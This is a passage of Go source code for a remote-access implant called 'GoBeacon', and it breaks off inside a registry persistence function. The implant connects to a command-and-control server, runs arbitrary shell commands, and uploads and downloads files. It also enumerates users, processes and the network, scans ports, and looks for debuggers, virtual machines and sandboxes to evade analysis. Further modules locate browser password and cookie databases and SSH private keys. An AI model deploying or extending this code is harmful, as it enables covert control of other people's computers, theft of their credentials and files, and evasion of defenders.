package main

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type GoBeacon struct {
	ServerIP       string
	ServerPort     int
	AgentID        string
	ComputerName   string
	CheckInterval  time.Duration
	IsRunning      bool
	Logger         *log.Logger
}

func NewGoBeacon(serverIP string, serverPort int) *GoBeacon {
	beacon := &GoBeacon{
		ServerIP:      serverIP,
		ServerPort:    serverPort,
		CheckInterval: 15 * time.Second,
		IsRunning:     false,
		Logger:        log.New(os.Stdout, "[GoBeacon] ", log.LstdFlags),
	}
	
	beacon.ComputerName = beacon.getComputerName()
	beacon.AgentID = beacon.generateAgentID()
	
	beacon.Logger.Printf("Go Beacon initialized")
	beacon.Logger.Printf("Agent ID: %s", beacon.AgentID)
	beacon.Logger.Printf("Computer: %s", beacon.ComputerName)
	beacon.Logger.Printf("Server: %s:%d", beacon.ServerIP, beacon.ServerPort)
	
	return beacon
}

func (b *GoBeacon) generateAgentID() string {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil {
		username = currentUser.Username
	}
	
	systemInfo := fmt.Sprintf("%s%s%s%s", hostname, username, runtime.GOOS, runtime.GOARCH)
	
	executable, _ := os.Executable()
	systemInfo += executable
	
	hash := md5.Sum([]byte(systemInfo))
	return hex.EncodeToString(hash[:])[:8]
}

func (b *GoBeacon) getComputerName() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func (b *GoBeacon) sendTCP(message string, expectResponse bool) (string, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", b.ServerIP, b.ServerPort), 30*time.Second)
	if err != nil {
		return "", fmt.Errorf("TCP connection failed: %v", err)
	}
	defer conn.Close()
	
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(message))
	if err != nil {
		return "", fmt.Errorf("TCP write failed: %v", err)
	}
	
	if expectResponse {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		buffer := make([]byte, 4096)
		n, err := conn.Read(buffer)
		if err != nil {
			return "", fmt.Errorf("TCP read failed: %v", err)
		}
		return strings.TrimSpace(string(buffer[:n])), nil
	}
	
	return "OK", nil
}

func (b *GoBeacon) register() error {
	message := fmt.Sprintf("register|%s|%s", b.AgentID, b.ComputerName)
	b.Logger.Printf("Attempting registration: %s", message)
	
	response, err := b.sendTCP(message, true)
	if err != nil {
		return err
	}
	
	b.Logger.Printf("Registration response: %s", response)
	return nil
}

func (b *GoBeacon) requestAction() (string, error) {
	message := fmt.Sprintf("request_action|%s", b.AgentID)
	return b.sendTCP(message, true)
}

func (b *GoBeacon) sendCommandOutput(output string) error {
	message := fmt.Sprintf("command_output|%s|%s", b.AgentID, output)
	_, err := b.sendTCP(message, false)
	return err
}

func (b *GoBeacon) executeCommand(command string) string {
	b.Logger.Printf("Executing command: %s", command)
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	var output bytes.Buffer
	var errorOutput bytes.Buffer
	cmd.Stdout = &output
	cmd.Stderr = &errorOutput
	
	err := cmd.Run()
	
	result := ""
	if output.Len() > 0 {
		result += fmt.Sprintf("STDOUT:\n%s\n", output.String())
	}
	if errorOutput.Len() > 0 {
		result += fmt.Sprintf("STDERR:\n%s\n", errorOutput.String())
	}
	if result == "" {
		if err != nil {
			result = fmt.Sprintf("Command failed: %v", err)
		} else {
			result = "Command executed successfully (no output)"
		}
	}
	
	return strings.TrimSpace(result)
}

func (b *GoBeacon) executeModule(module, parameters string) string {
	b.Logger.Printf("Executing module: %s with parameters: %s", module, parameters)
	
	switch module {
	case "SystemInfo":
		return b.moduleSystemInfo()
	case "ProcessEnum":
		return b.moduleProcessEnum()
	case "NetworkEnum":
		return b.moduleNetworkEnum()
	case "FileSearch":
		return b.moduleFileSearch(parameters)
	case "PortScan":
		return b.modulePortScan(parameters)
	case "AntiAnalysis":
		return b.moduleAntiAnalysis()
	case "ProcessHide":
		return b.moduleProcessHide(parameters)
	case "EnvironmentEnum":
		return b.moduleEnvironmentEnum()
	case "ServiceEnum":
		return b.moduleServiceEnum()
	case "UserEnum":
		return b.moduleUserEnum()
	case "DNSEnum":
		return b.moduleDNSEnum(parameters)
	case "TimingEvasion":
		return b.moduleTimingEvasion(parameters)
	case "BrowserCredentials":
		return b.moduleBrowserCredentials()
	case "SSHKeyDiscovery":
		return b.moduleSSHKeyDiscovery()
	case "RegistryPersistence":
		return b.moduleRegistryPersistence(parameters)
	case "AutostartPersistence":
		return b.moduleAutostartPersistence(parameters)
	case "SMBEnumeration":
		return b.moduleSMBEnumeration(parameters)
	case "RemoteServiceManagement":
		return b.moduleRemoteServiceManagement(parameters)
	default:
		return fmt.Sprintf("Unknown module: %s", module)
	}
}

func (b *GoBeacon) moduleSystemInfo() string {
	var info strings.Builder
	
	info.WriteString("=== SYSTEM INFORMATION ===\n")
	info.WriteString(fmt.Sprintf("Hostname: %s\n", b.ComputerName))
	info.WriteString(fmt.Sprintf("OS: %s\n", runtime.GOOS))
	info.WriteString(fmt.Sprintf("Architecture: %s\n", runtime.GOARCH))
	info.WriteString(fmt.Sprintf("Go Version: %s\n", runtime.Version()))
	info.WriteString(fmt.Sprintf("CPUs: %d\n", runtime.NumCPU()))
	
	if user, err := user.Current(); err == nil {
		info.WriteString(fmt.Sprintf("Current User: %s\n", user.Username))
		info.WriteString(fmt.Sprintf("User UID: %s\n", user.Uid))
		info.WriteString(fmt.Sprintf("User GID: %s\n", user.Gid))
		info.WriteString(fmt.Sprintf("Home Directory: %s\n", user.HomeDir))
	}
	
	if wd, err := os.Getwd(); err == nil {
		info.WriteString(fmt.Sprintf("Working Directory: %s\n", wd))
	}
	
	if exe, err := os.Executable(); err == nil {
		info.WriteString(fmt.Sprintf("Executable Path: %s\n", exe))
	}
	
	info.WriteString(fmt.Sprintf("Process PID: %d\n", os.Getpid()))
	info.WriteString(fmt.Sprintf("Parent PID: %d\n", os.Getppid()))
	
	return info.String()
}

func (b *GoBeacon) moduleProcessEnum() string {
	var result strings.Builder
	result.WriteString("=== PROCESS ENUMERATION ===\n")
	
	if runtime.GOOS == "windows" {
		cmd := exec.Command("tasklist", "/FO", "CSV")
		output, err := cmd.Output()
		if err != nil {
			return fmt.Sprintf("Error enumerating processes: %v", err)
		}
		result.Write(output)
	} else {
		cmd := exec.Command("ps", "aux")
		output, err := cmd.Output()
		if err != nil {
			return fmt.Sprintf("Error enumerating processes: %v", err)
		}
		result.Write(output)
	}
	
	return result.String()
}

func (b *GoBeacon) moduleNetworkEnum() string {
	var result strings.Builder
	result.WriteString("=== NETWORK ENUMERATION ===\n")
	
	interfaces, err := net.Interfaces()
	if err != nil {
		return fmt.Sprintf("Error getting network interfaces: %v", err)
	}
	
	for _, iface := range interfaces {
		result.WriteString(fmt.Sprintf("\nInterface: %s (MTU: %d)\n", iface.Name, iface.MTU))
		result.WriteString(fmt.Sprintf("Hardware Address: %s\n", iface.HardwareAddr))
		result.WriteString(fmt.Sprintf("Flags: %s\n", iface.Flags))
		
		addrs, err := iface.Addrs()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error getting addresses: %v\n", err))
			continue
		}
		
		for _, addr := range addrs {
			result.WriteString(fmt.Sprintf("  Address: %s\n", addr))
		}
	}
	
	result.WriteString("\n=== LISTENING PORTS ===\n")
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netstat", "-an")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error getting listening ports: %v\n", err))
		} else {
			result.Write(output)
		}
	} else {
		cmd := exec.Command("netstat", "-tulpn")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error getting listening ports: %v\n", err))
		} else {
			result.Write(output)
		}
	}
	
	return result.String()
}

func (b *GoBeacon) moduleFileSearch(parameters string) string {
	parts := strings.Split(parameters, ",")
	if len(parts) < 2 {
		return "FileSearch requires 2 parameters: directory,pattern"
	}
	
	searchDir := strings.TrimSpace(parts[0])
	pattern := strings.TrimSpace(parts[1])
	
	var result strings.Builder
	result.WriteString(fmt.Sprintf("=== FILE SEARCH ===\nSearching for '%s' in '%s'\n\n", pattern, searchDir))
	
	count := 0
	err := filepath.Walk(searchDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		
		if strings.Contains(strings.ToLower(info.Name()), strings.ToLower(pattern)) {
			result.WriteString(fmt.Sprintf("%s (%d bytes) - %s\n", path, info.Size(), info.ModTime().Format("2006-01-02 15:04:05")))
			count++
			if count >= 100 {
				result.WriteString("... (truncated at 100 results)\n")
				return filepath.SkipDir
			}
		}
		return nil
	})
	
	if err != nil {
		result.WriteString(fmt.Sprintf("Search error: %v\n", err))
	}
	
	result.WriteString(fmt.Sprintf("\nFound %d matching files\n", count))
	return result.String()
}

func (b *GoBeacon) modulePortScan(parameters string) string {
	parts := strings.Split(parameters, ",")
	if len(parts) < 2 {
		return "PortScan requires 2 parameters: target,ports (e.g., 192.168.1.1,80,443,3389)"
	}
	
	target := strings.TrimSpace(parts[0])
	var ports []int
	
	for i := 1; i < len(parts); i++ {
		if port, err := strconv.Atoi(strings.TrimSpace(parts[i])); err == nil {
			ports = append(ports, port)
		}
	}
	
	if len(ports) == 0 {
		return "No valid ports specified"
	}
	
	var result strings.Builder
	result.WriteString(fmt.Sprintf("=== PORT SCAN ===\nScanning %s for %d ports\n\n", target, len(ports)))
	
	openPorts := []int{}
	closedPorts := []int{}
	
	for _, port := range ports {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 3*time.Second)
		if err == nil {
			conn.Close()
			openPorts = append(openPorts, port)
			result.WriteString(fmt.Sprintf("Port %d: OPEN\n", port))
		} else {
			closedPorts = append(closedPorts, port)
		}
	}
	
	result.WriteString(fmt.Sprintf("\nScan Complete:\n"))
	result.WriteString(fmt.Sprintf("Open ports: %v\n", openPorts))
	result.WriteString(fmt.Sprintf("Closed/filtered ports: %d\n", len(closedPorts)))
	
	return result.String()
}

func (b *GoBeacon) moduleAntiAnalysis() string {
	var result strings.Builder
	result.WriteString("=== ANTI-ANALYSIS CHECKS ===\n")
	
	checks := map[string]func() bool{
		"Check for debugger":                 b.checkDebugger,
		"Check for virtual machine":         b.checkVM,
		"Check for sandbox environment":     b.checkSandbox,
		"Check for analysis tools":          b.checkAnalysisTools,
		"Check for low resource environment": b.checkLowResources,
	}
	
	for checkName, checkFunc := range checks {
		detected := checkFunc()
		status := "NOT DETECTED"
		if detected {
			status = "DETECTED"
		}
		result.WriteString(fmt.Sprintf("%s: %s\n", checkName, status))
	}
	
	return result.String()
}

func (b *GoBeacon) checkDebugger() bool {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("tasklist")
		output, err := cmd.Output()
		if err != nil {
			return false
		}
		debuggers := []string{"ollydbg.exe", "x64dbg.exe", "windbg.exe", "ida.exe", "ida64.exe"}
		outputStr := strings.ToLower(string(output))
		for _, debugger := range debuggers {
			if strings.Contains(outputStr, debugger) {
				return true
			}
		}
	} else {
		cmd := exec.Command("ps", "aux")
		output, err := cmd.Output()
		if err != nil {
			return false
		}
		debuggers := []string{"gdb", "strace", "ltrace", "radare2"}
		outputStr := strings.ToLower(string(output))
		for _, debugger := range debuggers {
			if strings.Contains(outputStr, debugger) {
				return true
			}
		}
	}
	return false
}

func (b *GoBeacon) checkVM() bool {
	vmIndicators := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "hyperv"}
	
	if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "computersystem", "get", "model")
		output, err := cmd.Output()
		if err == nil {
			outputStr := strings.ToLower(string(output))
			for _, indicator := range vmIndicators {
				if strings.Contains(outputStr, indicator) {
					return true
				}
			}
		}
	} else {
		dmidecodeCmd := exec.Command("dmidecode", "-s", "system-product-name")
		output, err := dmidecodeCmd.Output()
		if err == nil {
			outputStr := strings.ToLower(string(output))
			for _, indicator := range vmIndicators {
				if strings.Contains(outputStr, indicator) {
					return true
				}
			}
		}
	}
	
	return false
}

func (b *GoBeacon) checkSandbox() bool {
	sandboxIndicators := []string{
		"cuckoo", "sandbox", "malware", "analysis", "analyst", "sample", "virus",
	}
	
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	
	checkStrings := []string{strings.ToLower(hostname)}
	if user != nil {
		checkStrings = append(checkStrings, strings.ToLower(user.Username))
	}
	
	for _, checkStr := range checkStrings {
		for _, indicator := range sandboxIndicators {
			if strings.Contains(checkStr, indicator) {
				return true
			}
		}
	}
	
	return false
}

func (b *GoBeacon) checkAnalysisTools() bool {
	tools := []string{
		"wireshark", "tcpdump", "processhacker", "procmon", "regmon", "filemon",
		"apimonitor", "spy++", "procexp", "autoruns", "strings", "hexdump",
	}
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("tasklist")
	} else {
		cmd = exec.Command("ps", "aux")
	}
	
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	
	outputStr := strings.ToLower(string(output))
	for _, tool := range tools {
		if strings.Contains(outputStr, tool) {
			return true
		}
	}
	
	return false
}

func (b *GoBeacon) checkLowResources() bool {
	return runtime.NumCPU() <= 1
}

func (b *GoBeacon) moduleProcessHide(parameters string) string {
	return "Process hiding functionality not implemented in this version (requires advanced techniques)"
}

func (b *GoBeacon) moduleEnvironmentEnum() string {
	var result strings.Builder
	result.WriteString("=== ENVIRONMENT ENUMERATION ===\n")
	
	result.WriteString("\nEnvironment Variables:\n")
	for _, env := range os.Environ() {
		result.WriteString(fmt.Sprintf("%s\n", env))
	}
	
	result.WriteString("\nPath Directories:\n")
	pathVar := os.Getenv("PATH")
	if pathVar != "" {
		paths := strings.Split(pathVar, string(os.PathListSeparator))
		for _, path := range paths {
			if info, err := os.Stat(path); err == nil && info.IsDir() {
				result.WriteString(fmt.Sprintf("%s (exists)\n", path))
			} else {
				result.WriteString(fmt.Sprintf("%s (missing)\n", path))
			}
		}
	}
	
	return result.String()
}

func (b *GoBeacon) moduleServiceEnum() string {
	var result strings.Builder
	result.WriteString("=== SERVICE ENUMERATION ===\n")
	
	if runtime.GOOS == "windows" {
		cmd := exec.Command("sc", "query", "state=", "all")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error enumerating services: %v\n", err))
		} else {
			result.Write(output)
		}
	} else {
		cmd := exec.Command("systemctl", "list-units", "--type=service", "--no-pager")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString("Systemctl not available, trying alternative methods...\n")
			
			cmd = exec.Command("service", "--status-all")
			output, err = cmd.Output()
			if err != nil {
				result.WriteString(fmt.Sprintf("Error enumerating services: %v\n", err))
			} else {
				result.Write(output)
			}
		} else {
			result.Write(output)
		}
	}
	
	return result.String()
}

func (b *GoBeacon) moduleUserEnum() string {
	var result strings.Builder
	result.WriteString("=== USER ENUMERATION ===\n")
	
	current, err := user.Current()
	if err == nil {
		result.WriteString(fmt.Sprintf("Current User: %s (UID: %s, GID: %s)\n", current.Username, current.Uid, current.Gid))
		result.WriteString(fmt.Sprintf("Home Directory: %s\n", current.HomeDir))
	}
	
	result.WriteString("\nAll Users:\n")
	if runtime.GOOS == "windows" {
		cmd := exec.Command("net", "user")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error enumerating users: %v\n", err))
		} else {
			result.Write(output)
		}
		
		result.WriteString("\nAdministrators Group:\n")
		cmd = exec.Command("net", "localgroup", "administrators")
		output, err = cmd.Output()
		if err == nil {
			result.Write(output)
		}
	} else {
		cmd := exec.Command("cat", "/etc/passwd")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error reading /etc/passwd: %v\n", err))
		} else {
			result.Write(output)
		}
		
		result.WriteString("\nSudo Users:\n")
		cmd = exec.Command("getent", "group", "sudo")
		output, err = cmd.Output()
		if err == nil {
			result.Write(output)
		}
		
		cmd = exec.Command("getent", "group", "wheel")
		output, err = cmd.Output()
		if err == nil {
			result.WriteString("Wheel Group:\n")
			result.Write(output)
		}
	}
	
	return result.String()
}

func (b *GoBeacon) moduleDNSEnum(parameters string) string {
	if parameters == "" {
		return "DNSEnum requires a domain parameter"
	}
	
	domain := strings.TrimSpace(parameters)
	var result strings.Builder
	result.WriteString(fmt.Sprintf("=== DNS ENUMERATION for %s ===\n", domain))
	
	recordTypes := []string{"A", "AAAA", "MX", "NS", "TXT", "CNAME"}
	
	for _, recordType := range recordTypes {
		result.WriteString(fmt.Sprintf("\n%s Records:\n", recordType))
		
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("nslookup", "-type="+recordType, domain)
		} else {
			cmd = exec.Command("dig", "+short", recordType, domain)
		}
		
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error querying %s records: %v\n", recordType, err))
		} else {
			if len(output) > 0 {
				result.Write(output)
			} else {
				result.WriteString("No records found\n")
			}
		}
	}
	
	result.WriteString("\nReverse DNS Lookup:\n")
	addrs, err := net.LookupHost(domain)
	if err == nil {
		for _, addr := range addrs {
			names, err := net.LookupAddr(addr)
			if err == nil {
				result.WriteString(fmt.Sprintf("%s -> %v\n", addr, names))
			}
		}
	}
	
	return result.String()
}

func (b *GoBeacon) moduleTimingEvasion(parameters string) string {
	var result strings.Builder
	result.WriteString("=== TIMING EVASION ===\n")
	
	if parameters != "" {
		if sleepTime, err := strconv.Atoi(parameters); err == nil && sleepTime > 0 && sleepTime <= 300 {
			result.WriteString(fmt.Sprintf("Sleeping for %d seconds to evade analysis...\n", sleepTime))
			time.Sleep(time.Duration(sleepTime) * time.Second)
			result.WriteString("Sleep completed\n")
		} else {
			result.WriteString("Invalid sleep time (must be 1-300 seconds)\n")
		}
	} else {
		jitterSleep := rand.Intn(30) + 10
		result.WriteString(fmt.Sprintf("Applying random jitter delay: %d seconds\n", jitterSleep))
		time.Sleep(time.Duration(jitterSleep) * time.Second)
		result.WriteString("Jitter delay completed\n")
	}
	
	result.WriteString(fmt.Sprintf("Current beacon check interval: %v\n", b.CheckInterval))
	
	return result.String()
}

func (b *GoBeacon) downloadFile(filename string) string {
	b.Logger.Printf("Downloading file: %s", filename)
	
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", b.ServerIP, b.ServerPort), 30*time.Second)
	if err != nil {
		return fmt.Sprintf("ERROR: TCP connection failed: %v", err)
	}
	defer conn.Close()
	
	message := fmt.Sprintf("to_beacon|%s", filename)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(message))
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to send download request: %v", err)
	}
	
	downloadDir := filepath.Join(os.TempDir(), "beacon_downloads")
	os.MkdirAll(downloadDir, 0755)
	
	filePath := filepath.Join(downloadDir, filename)
	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to create file: %v", err)
	}
	defer file.Close()
	
	conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
	totalBytes, err := io.Copy(file, conn)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to download file: %v", err)
	}
	
	return fmt.Sprintf("File downloaded successfully: %s (%d bytes)", filePath, totalBytes)
}

func (b *GoBeacon) uploadFile(filename string) string {
	b.Logger.Printf("Uploading file: %s", filename)
	
	file, err := os.Open(filename)
	if err != nil {
		return fmt.Sprintf("ERROR: File not found: %v", err)
	}
	defer file.Close()
	
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", b.ServerIP, b.ServerPort), 30*time.Second)
	if err != nil {
		return fmt.Sprintf("ERROR: TCP connection failed: %v", err)
	}
	defer conn.Close()
	
	baseName := filepath.Base(filename)
	message := fmt.Sprintf("from_beacon|%s", baseName)
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write([]byte(message))
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to send upload request: %v", err)
	}
	
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to read server response: %v", err)
	}
	
	response := strings.TrimSpace(string(buffer[:n]))
	if response != "READY" {
		return fmt.Sprintf("ERROR: Server not ready: %s", response)
	}
	
	conn.SetWriteDeadline(time.Now().Add(5 * time.Minute))
	totalBytes, err := io.Copy(conn, file)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to upload file: %v", err)
	}
	
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	n, err = conn.Read(buffer)
	if err != nil {
		return fmt.Sprintf("ERROR: Failed to read upload response: %v", err)
	}
	
	finalResponse := strings.TrimSpace(string(buffer[:n]))
	return fmt.Sprintf("Upload response: %s (%d bytes sent)", finalResponse, totalBytes)
}

func (b *GoBeacon) processCommand(commandData string) {
	if commandData == "" || commandData == "No commands queued" || commandData == "no_pending_commands" {
		return
	}
	
	b.Logger.Printf("Processing command: %s", commandData)
	
	var output string
	
	if strings.HasPrefix(commandData, "execute_command|") {
		parts := strings.SplitN(commandData, "|", 2)
		if len(parts) >= 2 {
			output = b.executeCommand(parts[1])
		}
	} else if strings.HasPrefix(commandData, "execute_module|") {
		parts := strings.SplitN(commandData, "|", 3)
		if len(parts) >= 2 {
			module := parts[1]
			parameters := ""
			if len(parts) >= 3 {
				parameters = parts[2]
			}
			output = b.executeModule(module, parameters)
		}
	} else if strings.HasPrefix(commandData, "to_beacon|") {
		parts := strings.SplitN(commandData, "|", 2)
		if len(parts) >= 2 {
			output = b.downloadFile(parts[1])
		}
	} else if strings.HasPrefix(commandData, "from_beacon|") {
		parts := strings.SplitN(commandData, "|", 2)
		if len(parts) >= 2 {
			output = b.uploadFile(parts[1])
		}
	} else {
		output = b.executeCommand(commandData)
	}
	
	if err := b.sendCommandOutput(output); err != nil {
		b.Logger.Printf("Error sending command output: %v", err)
	}
}

func (b *GoBeacon) Run() {
	b.Logger.Println("Starting Go beacon...")
	
	if err := b.register(); err != nil {
		b.Logger.Printf("Registration failed: %v", err)
		return
	}
	
	b.IsRunning = true
	
	for b.IsRunning {
		action, err := b.requestAction()
		if err != nil {
			b.Logger.Printf("Error requesting action: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}
		
		if action != "" && !strings.HasPrefix(action, "ERROR") {
			b.processCommand(action)
		}
		
		jitter := time.Duration(rand.Intn(5000)) * time.Millisecond
		time.Sleep(b.CheckInterval + jitter)
	}
	
	b.Logger.Println("Beacon stopped")
}

// Advanced Credential Discovery Modules

func (b *GoBeacon) moduleBrowserCredentials() string {
	var result strings.Builder
	result.WriteString("=== BROWSER CREDENTIALS DISCOVERY ===\n")
	
	browsers := b.getBrowserPaths()
	found := 0
	
	for browserName, paths := range browsers {
		result.WriteString(fmt.Sprintf("\n--- %s ---\n", browserName))
		
		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				result.WriteString(fmt.Sprintf("Found database: %s\n", path))
				
				// Basic analysis without actually reading credentials
				if strings.Contains(path, "Login Data") || strings.Contains(path, "logins.json") {
					result.WriteString("  Type: Password database\n")
					found++
				} else if strings.Contains(path, "Cookies") {
					result.WriteString("  Type: Cookie database\n")
					found++
				}
				
				if info, err := os.Stat(path); err == nil {
					result.WriteString(fmt.Sprintf("  Size: %d bytes\n", info.Size()))
					result.WriteString(fmt.Sprintf("  Modified: %s\n", info.ModTime().Format("2006-01-02 15:04:05")))
				}
			}
		}
	}
	
	result.WriteString(fmt.Sprintf("\nTotal credential stores found: %d\n", found))
	result.WriteString("Note: Use specialized tools to extract encrypted credentials\n")
	
	return result.String()
}

func (b *GoBeacon) getBrowserPaths() map[string][]string {
	browsers := make(map[string][]string)
	
	if runtime.GOOS == "windows" {
		_ = os.Getenv("USERPROFILE") // userProfile for future use
		appData := os.Getenv("APPDATA")
		localAppData := os.Getenv("LOCALAPPDATA")
		
		browsers["Chrome"] = []string{
			filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data"),
			filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Cookies"),
		}
		browsers["Firefox"] = []string{
			filepath.Join(appData, "Mozilla", "Firefox", "Profiles"),
		}
		browsers["Edge"] = []string{
			filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
			filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Cookies"),
		}
		browsers["Opera"] = []string{
			filepath.Join(appData, "Opera Software", "Opera Stable", "Login Data"),
		}
		browsers["Brave"] = []string{
			filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
		}
		
	} else if runtime.GOOS == "darwin" {
		homeDir, _ := os.UserHomeDir()
		
		browsers["Chrome"] = []string{
			filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
			filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Cookies"),
		}
		browsers["Firefox"] = []string{
			filepath.Join(homeDir, "Library", "Application Support", "Firefox", "Profiles"),
		}
		browsers["Safari"] = []string{
			filepath.Join(homeDir, "Library", "Cookies", "Cookies.binarycookies"),
			filepath.Join(homeDir, "Library", "Keychains"),
		}
		browsers["Opera"] = []string{
			filepath.Join(homeDir, "Library", "Application Support", "com.operasoftware.Opera", "Login Data"),
		}
		
	} else {
		homeDir, _ := os.UserHomeDir()
		
		browsers["Chrome"] = []string{
			filepath.Join(homeDir, ".config", "google-chrome", "Default", "Login Data"),
			filepath.Join(homeDir, ".config", "google-chrome", "Default", "Cookies"),
		}
		browsers["Firefox"] = []string{
			filepath.Join(homeDir, ".mozilla", "firefox"),
		}
		browsers["Opera"] = []string{
			filepath.Join(homeDir, ".config", "opera", "Login Data"),
		}
		browsers["Brave"] = []string{
			filepath.Join(homeDir, ".config", "BraveSoftware", "Brave-Browser", "Default", "Login Data"),
		}
	}
	
	return browsers
}

func (b *GoBeacon) moduleSSHKeyDiscovery() string {
	var result strings.Builder
	result.WriteString("=== SSH KEY DISCOVERY ===\n")
	
	sshPaths := b.getSSHPaths()
	found := 0
	
	for keyType, paths := range sshPaths {
		result.WriteString(fmt.Sprintf("\n--- %s ---\n", keyType))
		
		for _, path := range paths {
			if info, err := os.Stat(path); err == nil {
				result.WriteString(fmt.Sprintf("Found: %s\n", path))
				result.WriteString(fmt.Sprintf("  Size: %d bytes\n", info.Size()))
				result.WriteString(fmt.Sprintf("  Mode: %s\n", info.Mode()))
				result.WriteString(fmt.Sprintf("  Modified: %s\n", info.ModTime().Format("2006-01-02 15:04:05")))
				
				// Check if it's encrypted
				if data, err := ioutil.ReadFile(path); err == nil && len(data) > 0 {
					if strings.Contains(string(data), "ENCRYPTED") {
						result.WriteString("  Status: Encrypted (passphrase required)\n")
					} else if strings.Contains(string(data), "PRIVATE KEY") {
						result.WriteString("  Status: Unencrypted private key\n")
					} else if strings.Contains(string(data), "PUBLIC KEY") {
						result.WriteString("  Status: Public key\n")
					}
				}
				found++
			}
		}
	}
	
	// Check for SSH config
	configPaths := []string{
		filepath.Join(os.Getenv("HOME"), ".ssh", "config"),
		filepath.Join(os.Getenv("USERPROFILE"), ".ssh", "config"),
	}
	
	for _, configPath := range configPaths {
		if _, err := os.Stat(configPath); err == nil {
			result.WriteString(fmt.Sprintf("\nSSH Config found: %s\n", configPath))
			if data, err := ioutil.ReadFile(configPath); err == nil {
				lines := strings.Split(string(data), "\n")
				hostCount := 0
				for _, line := range lines {
					if strings.HasPrefix(strings.TrimSpace(line), "Host ") {
						hostCount++
					}
				}
				result.WriteString(fmt.Sprintf("  Configured hosts: %d\n", hostCount))
			}
		}
	}
	
	result.WriteString(fmt.Sprintf("\nTotal SSH keys found: %d\n", found))
	
	return result.String()
}

func (b *GoBeacon) getSSHPaths() map[string][]string {
	sshKeys := make(map[string][]string)
	
	var sshDir string
	if runtime.GOOS == "windows" {
		sshDir = filepath.Join(os.Getenv("USERPROFILE"), ".ssh")
	} else {
		sshDir = filepath.Join(os.Getenv("HOME"), ".ssh")
	}
	
	sshKeys["Private Keys"] = []string{
		filepath.Join(sshDir, "id_rsa"),
		filepath.Join(sshDir, "id_dsa"),
		filepath.Join(sshDir, "id_ecdsa"),
		filepath.Join(sshDir, "id_ed25519"),
		filepath.Join(sshDir, "identity"),
	}
	
	sshKeys["Public Keys"] = []string{
		filepath.Join(sshDir, "id_rsa.pub"),
		filepath.Join(sshDir, "id_dsa.pub"),
		filepath.Join(sshDir, "id_ecdsa.pub"),
		filepath.Join(sshDir, "id_ed25519.pub"),
		filepath.Join(sshDir, "identity.pub"),
	}
	
	sshKeys["Known Hosts"] = []string{
		filepath.Join(sshDir, "known_hosts"),
		filepath.Join(sshDir, "authorized_keys"),
	}
	
	return sshKeys
}

// Persistence Modules

func (b *GoBeacon) moduleRegistryPersistence(parameters string) string {
	var result strings.Builder
	result.WriteString("=== REGISTRY PERSISTENCE ===\n")
	
	if runtime.GOOS != "windows" {
		result.WriteString("Registry persistence is Windows-specific.\n")
		result.WriteString("For Unix systems, use AutostartPersistence module.\n")
		return result.String()
	}
	
	parts := strings.Split(parameters, ",")
	if len(parts) < 3 {
		result.WriteString("Registry persistence requires: method,key_name,command\n")
		result.WriteString("Available methods:\n")
		methods := b.getRegistryPersistenceMethods()
		for method, desc := range methods {
			result.WriteString(fmt.Sprintf("  %s: %s\n", method, desc))
		}
		return result.String()
	}
	
	method := strings.TrimSpace(parts[0])
	keyName := strings.TrimSpace(parts[1])
